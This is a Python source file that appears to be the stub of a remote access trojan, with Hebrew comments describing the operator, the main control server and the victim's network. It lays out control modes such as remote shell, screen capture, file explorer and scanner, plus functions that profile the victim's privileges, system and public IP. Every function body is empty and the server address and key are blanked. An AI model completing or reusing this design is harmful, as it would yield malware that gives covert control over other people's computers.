# /* API */
from Api.config_packet import TCPConfigPacket, dumps, PACKET_ERROR, GetBlockPacket, new_key_xor
from Api.http_proto import use_http_proto
from Api.protocol import PACKET_TROJAN_PROTOCOL, OK
from socket import *
from os import urandom, getlogin
import binascii
import platform, base64
from time import sleep
import ctypes

# כתובת השרת הראשי שמנהל את כל רשת החיבורים
HOST = "" #// hidden
# מפתח שמשמש בעת התחברות לשרת הראשי
KEY = "" #// hidden
"""
	---- MODE_PACKAGE ----
 	קטגוריות לתפעול הסוס 
  	כל מצב מכיל פעולות רבות חצורך המימוש שלו
"""
MODE_PACKAGE = {
    0x1: "CONNECT",
    0x2: "PING",
    0x3: "SHELL",
    0x4: "SCREEN",
    0x5: "EXPLORER",
    0x6: "STREAMER",
    # not supported
    0x7: "SHELL-TER",
    # support
    0x8: "SCANNER",
    0x9: "SIGNAL"
}


class TcpConnect(TCPConfigPacket):
	
    def __init__(self):
		pass

    def tcp_create_socket(self):
		"""
		יצירת שקע	
  		"""
		pass

    def tcp_connect(self, __socket_error=10060) -> int:
		"""
  		מבצע חיבור, אם נכשל מחזיר את
		LastError()
  		"""
		pass

    def tcp_send_protocol_trojan(self):
		"""
  		אחרי התחברות עם המפעיל, הסוס שולח את תצורת והגדרות הסוס 
  		"""
		pass

    def tcp_set_setting(self):
		"""
  		יציאה לשרת הראשי לקבלת הגדרות המפעיל, כתובת לחיבור, יציאה, ותצורת החיבור
  		"""
		pass

    def tcp_send_packet(self, packet:bytes):
		"""
  		שליחה של מידע 
  		"""
		pass

    def tcp_get_packet(self, enc=1):
		"""
  		קבלה של מידע 
  		"""
		pass

    def __receive(self) -> bytes:
		"""
  		קבלת מידע ע"פ הפרוטוקול
  		"""
		pass

    def __send(self, packet:bytes) -> None:
		"""
  		שליחת מידע ע"פ הפרוטוקול
  		"""
		pass

    def tcp_close(self):
		"""
  		סגירה וניקוי של החיבור 
  		"""
		pass

def get_setting_from_server() -> tuple | bool:
	"""
 	יציאה לשרת הראשי לקבלת הגדרות המפעיל, כתובת לחיבור, יציאה, ותצורת החיבור
 	"""
	pass

def get_privilege() -> int:
	"""
 	שאילתה  בלבד!, ומחזיר  את התוצאה האם הסוס על משתמש חזק
 	"""
	pass

def get_platform():
	"""
 	מחזיר את שם המערכת
 	"""
	pass

def get_public_ip():
	"""
 	מחזיר את הכתובת הציבורית של רשת הקורבן
 	"""
	pass


